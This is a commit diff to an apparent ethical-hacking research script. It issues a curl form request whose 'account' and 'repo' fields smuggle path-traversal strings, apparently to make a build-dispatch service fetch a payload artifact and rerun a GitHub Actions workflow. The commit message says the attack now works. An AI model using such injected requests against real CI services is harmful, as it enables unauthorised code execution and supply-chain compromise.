af9d37abaa176b0ee7e5c6a76c39a1267d76da59
Daniel Eisele <daniel_eisele@gmx.de>
2024-08-19 18:47:57 +0200

    Re-run the entire workflow, not only a single job -> attack now works

--- dispatch_curl/request.sh
+++ dispatch_curl/request.sh
@@ -1,10 +1,10 @@
 curl \
-  -F "account=../../api/buildjobs/uwslrubaa7ve8vdq/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
+  -F "account=../../api/buildjobs/v4lkob3o6d91i7jj/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
   -F "project=libssh2-ethicalhacking" \
   -F "buildid=1337" \
   -F "base=main" \
   -F "hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
-  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/jobs/10239836102/rerun#" \
+  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/runs/10239836102/rerun#" \
   -F "ssh_host=127.0.0.1" \
   -F "ssh_port=2222" \
   -F "ssh_user=test" \
